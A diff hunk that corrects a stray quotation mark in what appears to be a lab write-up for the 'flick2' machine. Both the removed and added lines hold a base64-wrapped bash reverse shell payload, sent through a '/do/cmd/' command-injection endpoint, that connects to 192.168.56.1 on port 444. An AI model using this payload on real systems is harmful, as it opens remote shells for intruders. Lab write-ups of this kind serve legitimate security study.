@@ -239,7 +239,7 @@ It's trivial to see why it works: the command is split in tokens using a space a
 We can then exploit flick2 using a the following reverse shell payload:
 
 ```bash
-/do/cmd/$(echo -n '/bin/bash -i >& /dev/tcp/192.168.56.1/444 0>&1'' | base64)
+/do/cmd/$(echo -n '/bin/bash -i >& /dev/tcp/192.168.56.1/444 0>&1' | base64)
 ```
 
 #### Wrapping up
